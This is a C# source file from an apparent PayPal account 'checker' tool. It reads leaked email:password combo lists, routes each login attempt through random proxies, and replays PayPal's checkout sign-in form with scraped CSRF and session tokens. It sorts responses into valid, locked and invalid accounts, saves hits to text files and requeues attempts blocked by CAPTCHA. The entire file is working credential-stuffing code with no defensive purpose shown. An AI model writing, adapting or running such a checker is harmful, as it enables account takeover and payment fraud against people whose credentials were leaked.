using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check16
	{
		public static string Path4;
		public static string Path3;
		public static string Path2;
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking19.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking19.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking19.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								HttpResponse GetRequest = httpRequest.Get("https://www.paypal.com/signin?intent=checkout&ctxId=ullndg5617253d9ee24859b87230a519f426d6&returnUri=%252Fwebapps%252Fhermes&state=%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D68909346WP205534E%2526useraction%253Dcommit%2526rm%253D2%2526mfid%253D1493251164212_e335be39b9d1c%2526xclick_params%253DYnVzaW5lc3MlM0RhdGtpbnM3NiUyNTQwbmF2ZXIuY29tJTI2aXRlbV9uYW1lJTNEQ2xpcCUyNTIwRG93bmxvYWQlMjUyMC0lMjUyMCUyNTI4JTI1RUQlMjU5NSUyNTlDJTI1RUElMjVCOCUyNTgwJTI1MjlBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTIwb2ZmaWNlJTI1MjBzdG9yeSUyNTIwcGFydC4zJTI1MjBQdW5pc2htZW50JTI1MjBjYXRmaWdodCUyNTIwJTI1MjhBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTI5JTI2YW1vdW50JTNEOC4wMCUyNnJldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnBheXBhbCUyNTJGc3VjY2Vzcy5waHAlMjUzRm9pZCUyNTNEMjAxNzA0MjcwODU5MjE3MDE4JTI2Y2FuY2VsX3JldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnVwZGF0ZXMucGhwJTI2Y2hhcnNldCUzRHV0Zi04JTI2Y2J0JTNETXVzdCUyNTIwY2xpY2slMjUyMHRoaXMlMjUyMGZvciUyNTIwRG93bmxvYWQlMjUyMGNsaXAlMjUyMSUyNTIxJTI2bm9fc2hpcHBpbmclM0QxJTI2cm0lM0QyJTI2bm9fbm90ZSUzRDElMjZ3YV90eXBlJTNEQnV5Tm93JTI2Y291bnRlcnBhcnR5JTNEMTYxNjU1NDAzNzA0MDI2MjY5MA%25253D%25253D&flowId=68909346WP205534E&country.x=KR&locale.x=en_US");
								string text2 = GetRequest.ToString();
								string sess = Regex.Match(text2, "name=\"_sessionID\" value=\"(.*?)\"").Groups[1].Value;
								string crsf = Regex.Match(text2, "csrf-token=\"(.*?)\"").Groups[1].Value;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = true;
								byte[] bytes = Encoding.ASCII.GetBytes(string.Concat(new string[]
								{
								"_csrf=",
								crsf,
								"&_sessionID=",
								sess,
								"&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%252268909346WP205534E%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1602159929461%252C%2522eteid%2522%253A%255B5370987864%252C-6901211352%252C-2064923382%252C-566056192%252C-4290756854%252C-1465694550%252Cnull%252Cnull%255D%252C%2522tts%2522%253A1463%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A1024%252C%255C%2522width%255C%2522%253A1280%252C%255C%2522availHeight%255C%2522%253A984%252C%255C%2522availWidth%255C%2522%253A1280%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F85.0.XMR252231067%252C30872%252C30745%253A10550%252C10396%252C10254%253A5403%252C5290%252C5131%253A30996%252C30922%252C30746%253A10484%252C10444%252C10255%253A41204%252C41196%252C40991%253A10450%252C10472%252C10254%253A30928%252C30976%252C30746%253A36037%252C36109%252C35869%253A5289%252C5380%252C5132%253A36019%252C36125%252C35869%253A30890%252C31008%252C30745%253A46254%252C46382%252C46115%253A36004%252C36140%252C35869%253A25755%252C25898%252C25623%253A15507%252C15654%252C15377%253A51367%252C51517%252C51238%253A30872%252C31034%252C30746%253A5257%252C5422%252C5131%253A51366%252C51532%252C51238%253A17990%252C31%2522%257D%257D&otpMayflyKey=59e33e7e59f14811adf116b4b7f3a3c6otpChlg&intent=checkout&ads-client-context=checkout&flowId=68909346WP205534E&ads-client-context-data=%7B%22context_id%22%3A%7B%22context_id%22%3A%2268909346WP205534E%22%2C%22channel%22%3A0%2C%22flow_type%22%3A%22checkout%22%7D%7D&ctxId=ullndg5617253d9ee24859b87230a519f426d6&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dullndg5617253d9ee24859b87230a519f426d6%26returnUri%3D%25252Fwebapps%25252Fhermes%26state%3D%25253Fflow%25253D1-P%252526ulReturn%25253Dtrue%252526token%25253D68909346WP205534E%252526useraction%25253Dcommit%252526rm%25253D2%252526mfid%25253D1493251164212_e335be39b9d1c%252526xclick_params%25253DYnVzaW5lc3MlM0RhdGtpbnM3NiUyNTQwbmF2ZXIuY29tJTI2aXRlbV9uYW1lJTNEQ2xpcCUyNTIwRG93bmxvYWQlMjUyMC0lMjUyMCUyNTI4JTI1RUQlMjU5NSUyNTlDJTI1RUElMjVCOCUyNTgwJTI1MjlBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTIwb2ZmaWNlJTI1MjBzdG9yeSUyNTIwcGFydC4zJTI1MjBQdW5pc2htZW50JTI1MjBjYXRmaWdodCUyNTIwJTI1MjhBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTI5JTI2YW1vdW50JTNEOC4wMCUyNnJldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnBheXBhbCUyNTJGc3VjY2Vzcy5waHAlMjUzRm9pZCUyNTNEMjAxNzA0MjcwODU5MjE3MDE4JTI2Y2FuY2VsX3JldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnVwZGF0ZXMucGhwJTI2Y2hhcnNldCUzRHV0Zi04JTI2Y2J0JTNETXVzdCUyNTIwY2xpY2slMjUyMHRoaXMlMjUyMGZvciUyNTIwRG93bmxvYWQlMjUyMGNsaXAlMjUyMSUyNTIxJTI2bm9fc2hpcHBpbmclM0QxJTI2cm0lM0QyJTI2bm9fbm90ZSUzRDElMjZ3YV90eXBlJTNEQnV5Tm93JTI2Y291bnRlcnBhcnR5JTNEMTYxNjU1NDAzNzA0MDI2MjY5MA%2525253D%2525253D%26flowId%3D68909346WP205534E%26country.x%3DKR%26locale.x%3Den_US&forcePhonePasswordOptIn=&returnUri=%252Fwebapps%252Fhermes&state=%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D68909346WP205534E%2526useraction%253Dcommit%2526rm%253D2%2526mfid%253D1493251164212_e335be39b9d1c%2526xclick_params%253DYnVzaW5lc3MlM0RhdGtpbnM3NiUyNTQwbmF2ZXIuY29tJTI2aXRlbV9uYW1lJTNEQ2xpcCUyNTIwRG93bmxvYWQlMjUyMC0lMjUyMCUyNTI4JTI1RUQlMjU5NSUyNTlDJTI1RUElMjVCOCUyNTgwJTI1MjlBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTIwb2ZmaWNlJTI1MjBzdG9yeSUyNTIwcGFydC4zJTI1MjBQdW5pc2htZW50JTI1MjBjYXRmaWdodCUyNTIwJTI1MjhBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTI5JTI2YW1vdW50JTNEOC4wMCUyNnJldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnBheXBhbCUyNTJGc3VjY2Vzcy5waHAlMjUzRm9pZCUyNTNEMjAxNzA0MjcwODU5MjE3MDE4JTI2Y2FuY2VsX3JldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnVwZGF0ZXMucGhwJTI2Y2hhcnNldCUzRHV0Zi04JTI2Y2J0JTNETXVzdCUyNTIwY2xpY2slMjUyMHRoaXMlMjUyMGZvciUyNTIwRG93bmxvYWQlMjUyMGNsaXAlMjUyMSUyNTIxJTI2bm9fc2hpcHBpbmclM0QxJTI2cm0lM0QyJTI2bm9fbm90ZSUzRDElMjZ3YV90eXBlJTNEQnV5Tm93JTI2Y291bnRlcnBhcnR5JTNEMTYxNjU1NDAzNzA0MDI2MjY5MA%25253D%25253D&phoneCode=KR+%2B82&login_email=",
								email,
								"&login_password=",
								password,
								"&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=0255c74e9678f7282054d20106dff8e5eb541c18d8985ef231793c2be837df8f"
								}));
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								string yes = email + ":" + password;
								HttpResponse PostRequest = httpRequest.Post("https://www.paypal.com/signin?intent=checkout&ctxId=ullndg5617253d9ee24859b87230a519f426d6&returnUri=%252Fwebapps%252Fhermes&state=%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D68909346WP205534E%2526useraction%253Dcommit%2526rm%253D2%2526mfid%253D1493251164212_e335be39b9d1c%2526xclick_params%253DYnVzaW5lc3MlM0RhdGtpbnM3NiUyNTQwbmF2ZXIuY29tJTI2aXRlbV9uYW1lJTNEQ2xpcCUyNTIwRG93bmxvYWQlMjUyMC0lMjUyMCUyNTI4JTI1RUQlMjU5NSUyNTlDJTI1RUElMjVCOCUyNTgwJTI1MjlBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTIwb2ZmaWNlJTI1MjBzdG9yeSUyNTIwcGFydC4zJTI1MjBQdW5pc2htZW50JTI1MjBjYXRmaWdodCUyNTIwJTI1MjhBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTI5JTI2YW1vdW50JTNEOC4wMCUyNnJldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnBheXBhbCUyNTJGc3VjY2Vzcy5waHAlMjUzRm9pZCUyNTNEMjAxNzA0MjcwODU5MjE3MDE4JTI2Y2FuY2VsX3JldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnVwZGF0ZXMucGhwJTI2Y2hhcnNldCUzRHV0Zi04JTI2Y2J0JTNETXVzdCUyNTIwY2xpY2slMjUyMHRoaXMlMjUyMGZvciUyNTIwRG93bmxvYWQlMjUyMGNsaXAlMjUyMSUyNTIxJTI2bm9fc2hpcHBpbmclM0QxJTI2cm0lM0QyJTI2bm9fbm90ZSUzRDElMjZ3YV90eXBlJTNEQnV5Tm93JTI2Y291bnRlcnBhcnR5JTNEMTYxNjU1NDAzNzA0MDI2MjY5MA%25253D%25253D&flowId=68909346WP205534E&country.x=KR&locale.x=en_US", bytes, "application/x-www-form-urlencoded");
								var key = PostRequest.ToString();
								if (key.Contains("For security reasons, you’ll need to"))
								{
									Interlocked.Increment(ref Checking19.CheckedLines);
									Interlocked.Increment(ref Checking19.currentCpm);
									Interlocked.Increment(ref Checking19.custom);
									if (Program.config.printlocked == "True")
									{
										Console.WriteLine("[»] Locked - " + account, Color.DarkOrange);
									}
									Save(Path + "\\LOCKED.txt", account);
									break;
								}
								else if (key.Contains("adsRecaptchaSiteKey") || key.Contains("captcha code") || key.Contains("CSRF token mismatch") || key.Contains("CSRF token missing") || key.Contains("403 Forbidden") || key.Contains("Access Denied") || string.IsNullOrEmpty(key))
								{
									string acc1 = email + ":" + password;
									Checking19.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking19.retry);
									break;
								}
								else if (key.Contains("Vérification rapide") || key.Contains("Quick security") || key.Contains("PayPal is looking") || key.Contains("We noticed some unusual"))
								{
									string t3 = PostRequest.ToString();
									Interlocked.Increment(ref Checking19.CheckedLines);
									Interlocked.Increment(ref Checking19.currentCpm);
									Interlocked.Increment(ref Checking19.Hits);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									Save(Path + "\\Valid.txt", acc);
									break;
								}
								else if (key.Contains("LoginFailed"))
								{
									Interlocked.Increment(ref Checking19.CheckedLines);
									Interlocked.Increment(ref Checking19.currentCpm);
									Interlocked.Increment(ref Checking19.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
								{
									string acc1 = email + ":" + password;
									Checking6.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking19.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking19.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking19.retry);
							}
						}
					}
				}
			}
		}

			public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
